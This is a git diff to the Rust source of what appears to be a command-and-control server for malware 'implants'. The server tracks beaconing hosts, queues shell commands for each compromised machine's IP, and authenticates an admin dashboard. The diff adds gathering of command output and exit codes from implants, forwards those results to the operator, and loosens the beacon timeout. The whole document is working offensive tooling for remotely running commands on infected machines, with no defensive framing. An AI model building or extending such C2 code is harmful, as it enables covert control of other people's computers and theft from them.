@@ -15,6 +15,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     let implants = Arc::new(Mutex::new(HashMap::new()));
     let admin_ip = Arc::new(Mutex::new(None));
     let command_queue = Arc::new(Mutex::new(HashMap::<IpAddr, Vec<String>>::new()));
+    let results = Arc::new(Mutex::new(Vec::new()));
 
     for stream in listener.incoming() {
         let mut stream = stream.unwrap();
@@ -22,6 +23,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         let implants = Arc::clone(&implants);
         let admin_ip = Arc::clone(&admin_ip);
         let command_queue = Arc::clone(&command_queue);
+        let results = Arc::clone(&results);
 
         thread::spawn(move || {
             let ip = stream.peer_addr().unwrap().ip();
@@ -42,12 +44,20 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                     stream
                         .write(
                             encode(Packet::CommandList {
-                                commands: command_queue.lock().unwrap().get(&ip).unwrap().clone(),
+                                commands: command_queue
+                                    .lock()
+                                    .unwrap()
+                                    .get(&ip)
+                                    .unwrap_or(&Vec::new())
+                                    .clone(),
                             })
                             .unwrap()
                             .as_slice(),
                         )
                         .unwrap();
+                    if let Some(commands) = command_queue.lock().unwrap().get_mut(&ip) {
+                        commands.clear();
+                    }
                 }
                 Packet::DashboardLogin { password } => {
                     let passwd = match env::var_os("TYSE_PASSWORD") {
@@ -69,6 +79,14 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                             .unwrap();
                     }
                 }
+                Packet::CommandResults {
+                    results: result_list,
+                } => {
+                    for (output, exit_code) in result_list {
+                        println!("({exit_code}) {output}");
+                        results.lock().unwrap().push((output, exit_code));
+                    }
+                }
                 _ => {
                     if let Some(admin_ip) = *admin_ip.lock().unwrap()
                         && stream.peer_addr().unwrap().ip() == admin_ip
@@ -76,6 +94,20 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                         let mut commands = command_queue.lock().unwrap();
                         if !commands.contains_key(&ip) {
                             commands.insert(ip, Vec::new());
+                        }
+
+                        if !results.lock().unwrap().is_empty() {
+                            stream
+                                .write(
+                                    encode(Packet::CommandResults {
+                                        results: results.lock().unwrap().clone(),
+                                    })
+                                    .unwrap()
+                                    .as_slice(),
+                                )
+                                .unwrap();
+                            results.lock().unwrap().clear();
+                            stream.flush().unwrap();
                         }
 
                         run_admin_command(
@@ -107,8 +139,8 @@ fn run_admin_command(
 ) -> Result<(), Box<dyn std::error::Error>> {
     match packet {
         Packet::ImplantListRequest => {
-            println!("The admin requested the implant list");
-            remove_old_implants(implants);
+            println!("The admin requested the implant list: {implants:?}");
+            // remove_old_implants(implants);
 
             stream.write(
                 encode(Packet::ImplantList(
@@ -118,7 +150,7 @@ fn run_admin_command(
                 .as_slice(),
             )?;
         }
-        Packet::CommandPacket {
+        Packet::Command {
             implant_id,
             command,
         } => {
@@ -143,7 +175,7 @@ fn remove_old_implants(implants: &mut HashMap<IpAddr, Implant>) -> HashMap<IpAdd
             now.duration_since(implant.last_beacon_timestamp)
                 .unwrap()
                 .as_secs()
-                < IMPLANT_REPORT_RATE_SECONDS.end
+                < IMPLANT_REPORT_RATE_SECONDS.end + 60
         })
         .map(|(ip, implant)| (*ip, implant.clone()))
         .collect()
